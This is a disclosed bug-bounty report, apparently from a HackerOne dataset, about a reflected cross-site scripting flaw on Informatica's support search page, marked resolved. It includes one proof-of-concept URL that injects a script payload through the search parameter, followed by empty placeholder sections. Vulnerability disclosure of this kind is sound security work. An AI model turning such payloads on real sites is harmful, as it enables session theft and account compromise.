---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '39069'
original_report_id: '39069'
title: '[mysupport.informatica.com] - reflected XSS'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: informatica
created_at: '2014-12-11T17:36:08.264Z'
disclosed_at: '2023-10-05T04:59:07.705Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 30
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [mysupport.informatica.com] - reflected XSS

## Metadata

- HackerOne Report ID: 39069
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: informatica
- Disclosed At: 2023-10-05T04:59:07.705Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

mysupport.informatica.com has reflected XSS vulnerability.

I used browser is Firefox 34.0.5
PoC:
https://mysupport.informatica.com/search.jspa?q=zzz%3C%2Fscript%3E%3Cscript%3Econfirm%28document.domain%29%3B%3C%2Fscript%3E

thanks

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
